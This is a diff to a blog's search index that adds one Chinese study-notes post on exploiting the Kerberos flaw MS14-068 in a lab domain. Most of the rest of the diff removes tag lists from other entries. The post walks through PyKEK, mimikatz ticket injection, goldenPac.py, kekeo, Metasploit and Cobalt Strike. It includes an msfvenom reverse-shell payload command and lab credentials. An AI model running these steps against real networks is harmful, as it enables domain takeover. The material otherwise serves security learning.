@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>【内网学习笔记】27、Kerberos 域用户提权漏洞</title>
+      <link href="//210924-100520.html"/>
+      <url>//210924-100520.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>在 2014 年微软修复了 Kerberos 域用户提权漏洞，即 MS14-068，CVE 编号为 CVE-2014-6324，该漏洞影响了 Windows Server 2012 R2 以下的服务器，该漏洞允许 RT 将任意用户权限提升至域管级别。</p><p>不过从漏洞年代就知道这已经是个远古时代的漏洞，现实中已经很少会碰到了，这里就简单记录下，顺便熟悉熟悉工具的用法。</p><p>14-068 产生的原因主要在于用户可以利用伪造的票据向认证服务器发起请求，如果用户伪造域管的票据，服务端就会把拥有域管权限的服务票据返回回来。</p><h2 id="1、PyKEK"><a href="#1、PyKEK" class="headerlink" title="1、PyKEK"></a>1、PyKEK</h2><p>PyKEK 是一个利用 Kerberos 协议进行渗透的工具包，下载地址：<a href="https://github.com/mubix/pykek">https://github.com/mubix/pykek</a></p><p>使用 PyKEK 可以生成一个高权限的服务票据，之后通过 mimikatz 将服务票据导入到内存中。</p><p>MS 14-068 的补丁为：KB3011780，通过 wmic 查看补丁情况</p><pre class="line-numbers language-none"><code class="language-none">wmic qfe get hotfixid | findstr KB3011780<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看当前用户 SID</p><pre class="line-numbers language-none"><code class="language-none">whoami &#x2F;user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用 wmic </p><pre class="line-numbers language-none"><code class="language-none">wmic useraccount get name,sid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成高权限票据，-d 指定域控地址</p><pre class="line-numbers language-none"><code class="language-none">python2 ms14-068.py -u jack@0day.org -s S-1-5-21-1812960810-2335050734-3517558805-1133 -d 192.168.3.142 -p Aa123456<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>打开 mimikatz 清除当前内存中的票据信息</p><pre class="line-numbers language-none"><code class="language-none">kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将高权限票据注入内存</p><pre class="line-numbers language-none"><code class="language-none">kerberos::ptc &quot;TGT_jack@0day.org.ccache&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 net use 连接域控后，使用 psexec 获取 Shell</p><blockquote><p>这里 net ues 使用 IP 可能会失败，因此在此使用机器名进行连接 </p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202109231733653.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="2、GoldenPac"><a href="#2、GoldenPac" class="headerlink" title="2、GoldenPac"></a>2、GoldenPac</h2><p>goldenPac.py 是一个用于对 Kerberos 协议进行测试的工具，它集成在 impacket 工具包里。</p><p>Kali 在使用之前需要先安装 Kerberos 客户端</p><pre class="line-numbers language-none"><code class="language-none">apt-get install krb5-user -y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用 goldenPac.py 获取 Shell</p><pre class="line-numbers language-none"><code class="language-none">python3 goldenPac.py 0day.org&#x2F;jack:Aa123456@OWA2010SP3.0day.org<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>这里使用 IP 进行连接会连接不成功，只能使用主机名，因此可以在 hosts 文件中添加主机名对应的 IP</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202109231746641.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>goldenPac.py 是通过 PsExec 获得 Shell 的，因此会产生大量的日志，而且现在这种连接方式也已经被各大杀软所拦截。</p><h2 id="3、kekeo"><a href="#3、kekeo" class="headerlink" title="3、kekeo"></a>3、kekeo</h2><p>kekeo 也是一个工具集，其中包含了 ms14-068 的利用模块，kekeo 下载地址：<a href="https://github.com/gentilkiwi/kekeo">https://github.com/gentilkiwi/kekeo</a></p><p>使用之前需要先清除票据</p><pre class="line-numbers language-none"><code class="language-none">klist purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后直接使用 kekeo 生成高权限票据</p><pre class="line-numbers language-none"><code class="language-none">kekeo.exe &quot;exploit::ms14068 &#x2F;domain:0day.org &#x2F;user:jack &#x2F;password:Aa123456 &#x2F;ptt&quot; &quot;exit&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后就可以直接 dir 域控或者 PsExec 连接到域控了</p><h2 id="4、MSF"><a href="#4、MSF" class="headerlink" title="4、MSF"></a>4、MSF</h2><p>MSF 中也有 MS 14-086 的提权 EXP，不过需要结合 mimikatz 进行利用</p><pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;admin&#x2F;kerberos&#x2F;ms14_068_kerberos_checksumset domain 0day.orgset password Aa123456set user jackset user_sid  S-1-5-21-1812960810-2335050734-3517558805-1133set rhosts OWA2010SP3.0day.orgrun<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>设置好域名、域控 IP、密码、用户、SID 后运行，将会获取一个 bin 文件</p><p>由于 MSF 里不支持 bin 文件的导入，因此需要 mimikatz 对其进行格式转换</p><pre class="line-numbers language-none"><code class="language-none">kerberos::clist &quot;20210923061821_default_192.168.3.142_windows.kerberos_484249.bin&quot; &#x2F;export<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后，生成一个木马</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;172.16.214.74 lport&#x3D;4444 -f exe &gt; shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将木马复制到目标主机上，并使其上线到 MSF</p><p>获得会话后，将刚才 mimikatz 转换后的 kirbi 文件导入到会话中</p><pre class="line-numbers language-none"><code class="language-none">load kiwikerberos_ticket_use &#x2F;tmp&#x2F;0-00000000-jack@krbtgt-0DAY.ORG.kirbibackground<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>之后使用 current_user_psexec 模块</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;local&#x2F;current_user_psexecset session 2set rhosts OWA2010SP3.0day.orgset payload windows&#x2F;meterpreter&#x2F;reverse_tcpset lhost 172.16.214.74run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后就会返回高权限的会话</p><blockquote><p>不过 MSF 在使用过程中报错了，网上一查发现别人也有这个错误，暂时还不清楚解决的方法</p></blockquote><h2 id="5、CS"><a href="#5、CS" class="headerlink" title="5、CS"></a>5、CS</h2><p>先利用前面的 ms14-068.py 生成一个 ccache 文件，之后使用 KrbCredExport 将 ccache 文件转为 kirbi 格式</p><p>KrbCredExport 下载地址：<a href="https://github.com/rvazarkar/KrbCredExport">https://github.com/rvazarkar/KrbCredExport</a></p><pre class="line-numbers language-none"><code class="language-none">python2 KrbCredExport.py TGT_jack@0day.org.ccache user.ticket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接着使用 CS 的 kerberos_ticket_use 加载 ticket，之后就能访问到域控了</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202109240943968.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>此时想让域控上线自然也是没问题的了，可以先添加一个域控地址的 target，然后选择 PsExec ，勾选上 use session’s current access token 通过 jack 的会话上线即可。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202109241000974.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>参考文章：</p><p><a href="https://www.jianshu.com/p/27730ab4a6db">https://www.jianshu.com/p/27730ab4a6db</a></p><p><a href="https://www.cnblogs.com/websecyw/p/11835830.html">https://www.cnblogs.com/websecyw/p/11835830.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 内网学习笔记 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Kerberos 协议详解与利用</title>
       <link href="//210923-151418.html"/>
       <url>//210923-151418.html</url>
@@ -17,16 +36,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-            <tag> 内网 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -47,16 +56,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-            <tag> 内网 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -75,16 +74,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-            <tag> 内网 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -105,16 +94,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-            <tag> 内网 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -133,16 +112,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-            <tag> 内网 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -163,16 +132,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-            <tag> 内网 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -191,16 +150,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-            <tag> 内网 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -221,16 +170,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-            <tag> 内网 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -249,16 +188,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> RCE </tag>
-            
-            <tag> 防御 </tag>
-            
-            <tag> 反制 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -279,16 +208,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-            <tag> 内网 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -307,16 +226,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-            <tag> 内网 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -337,16 +246,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-            <tag> 内网 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -365,16 +264,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-            <tag> 内网 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -395,16 +284,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-            <tag> 内网 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -423,16 +302,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-            <tag> 内网 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -453,16 +322,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 漏洞复现 </tag>
-            
-            <tag> 提权漏洞 </tag>
-            
-            <tag> Windows </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -481,16 +340,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-            <tag> 内网 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -511,16 +360,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-            <tag> 内网 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -539,16 +378,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-            <tag> 内网 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -569,16 +398,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-            <tag> 内网 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -597,14 +416,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> Windows 11 </tag>
-            
-            <tag> 尝鲜 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -625,16 +436,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-            <tag> 内网 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -653,16 +454,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-            <tag> 内网 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -683,16 +474,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-            <tag> 内网 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -711,16 +492,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-            <tag> 内网 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -741,16 +512,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-            <tag> 内网 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -769,16 +530,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-            <tag> 内网 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -799,16 +550,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-            <tag> 内网 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -827,16 +568,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-            <tag> 内网 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -857,16 +588,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-            <tag> 内网 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -885,16 +606,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-            <tag> 内网 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -915,16 +626,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> Python </tag>
-            
-            <tag> 蓝队 </tag>
-            
-            <tag> 威胁情报 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -943,16 +644,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-            <tag> 内网 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -973,16 +664,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-            <tag> 内网 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -1001,16 +682,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-            <tag> 内网 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -1031,16 +702,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-            <tag> 内网 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -1059,16 +720,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-            <tag> 内网 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -1089,16 +740,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-            <tag> 内网 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -1117,16 +758,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> Cobalt Strike </tag>
-            
-            <tag> MSF </tag>
-            
-            <tag> 经验总结 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -1147,16 +778,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> SRC </tag>
-            
-            <tag> XSS </tag>
-            
-            <tag> 经验总结 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -1175,14 +796,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> Python </tag>
-            
-            <tag> 批量工具 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -1203,16 +816,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> Python </tag>
-            
-            <tag> 批量工具 </tag>
-            
-            <tag> SRC </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -1231,16 +834,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> Cobalt Strike </tag>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -1261,12 +854,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 经验总结 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -1285,16 +872,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 工具分享 </tag>
-            
-            <tag> 经验总结 </tag>
-            
-            <tag> reNgine </tag>
-            
-        </tags>
       
     </entry>
     
@@ -1315,16 +892,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 经验总结 </tag>
-            
-            <tag> 代理 </tag>
-            
-            <tag> 负载均衡 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -1343,16 +910,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 漏洞检测 </tag>
-            
-            <tag> shiro </tag>
-            
-            <tag> RCE </tag>
-            
-        </tags>
       
     </entry>
     
@@ -1373,14 +930,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 工具分享 </tag>
-            
-            <tag> Github </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -1399,16 +948,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> Cobalt Strike </tag>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -1429,16 +968,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> Cobalt Strike </tag>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -1457,16 +986,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> Cobalt Strike </tag>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -1487,16 +1006,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> Cobalt Strike </tag>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -1515,16 +1024,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> Cobalt Strike </tag>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -1545,16 +1044,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> Cobalt Strike </tag>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -1573,16 +1062,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> Cobalt Strike </tag>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -1603,16 +1082,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> Cobalt Strike </tag>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -1631,16 +1100,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> Cobalt Strike </tag>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -1661,16 +1120,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> Cobalt Strike </tag>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -1689,16 +1138,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> Cobalt Strike </tag>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -1719,16 +1158,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> Cobalt Strike </tag>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -1747,16 +1176,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> Cobalt Strike </tag>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -1777,16 +1196,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> Cobalt Strike </tag>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -1805,16 +1214,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> Cobalt Strike </tag>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -1835,16 +1234,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> Cobalt Strike </tag>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -1863,16 +1252,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> Cobalt Strike </tag>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -1893,16 +1272,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> Cobalt Strike </tag>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -1921,16 +1290,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> Cobalt Strike </tag>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -1951,16 +1310,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> Cobalt Strike </tag>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -1979,16 +1328,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> Cobalt Strike </tag>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -2009,16 +1348,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> Cobalt Strike </tag>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -2037,16 +1366,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> Cobalt Strike </tag>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -2067,16 +1386,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> Cobalt Strike </tag>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -2095,16 +1404,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> Cobalt Strike </tag>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -2125,16 +1424,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> Cobalt Strike </tag>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -2153,16 +1442,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> Cobalt Strike </tag>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -2183,16 +1462,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> Cobalt Strike </tag>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 红队 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -2211,16 +1480,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 工具分享 </tag>
-            
-            <tag> 软件 </tag>
-            
-            <tag> Pigat </tag>
-            
-        </tags>
       
     </entry>
     
@@ -2241,16 +1500,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 渗透实例 </tag>
-            
-            <tag> Fuzz </tag>
-            
-            <tag> Xray </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -2269,16 +1518,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> Python </tag>
-            
-            <tag> Django </tag>
-            
-        </tags>
       
     </entry>
     
@@ -2299,16 +1538,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> Python </tag>
-            
-            <tag> Django </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -2327,16 +1556,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> Python </tag>
-            
-            <tag> Django </tag>
-            
-        </tags>
       
     </entry>
     
@@ -2357,16 +1576,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> Python </tag>
-            
-            <tag> Django </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -2385,16 +1594,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> Python </tag>
-            
-            <tag> Django </tag>
-            
-        </tags>
       
     </entry>
     
@@ -2415,16 +1614,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 工具分享 </tag>
-            
-            <tag> jQuery </tag>
-            
-            <tag> XSS </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -2443,16 +1632,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> BurpSuite </tag>
-            
-            <tag> 软件 </tag>
-            
-            <tag> 经验总结 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -2473,16 +1652,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> BurpSuite </tag>
-            
-            <tag> 工具分享 </tag>
-            
-            <tag> 软件 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -2501,16 +1670,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> XSS </tag>
-            
-            <tag> CSRF </tag>
-            
-            <tag> 组合拳 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -2531,16 +1690,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 经验总结 </tag>
-            
-            <tag> Python3 </tag>
-            
-            <tag> 解决办法 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -2559,16 +1708,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 经验总结 </tag>
-            
-            <tag> SQL 注入 </tag>
-            
-            <tag> Bypass </tag>
-            
-        </tags>
       
     </entry>
     
@@ -2589,16 +1728,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> Python </tag>
-            
-            <tag> Scrapy </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -2617,16 +1746,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> Python </tag>
-            
-            <tag> Scrapy </tag>
-            
-        </tags>
       
     </entry>
     
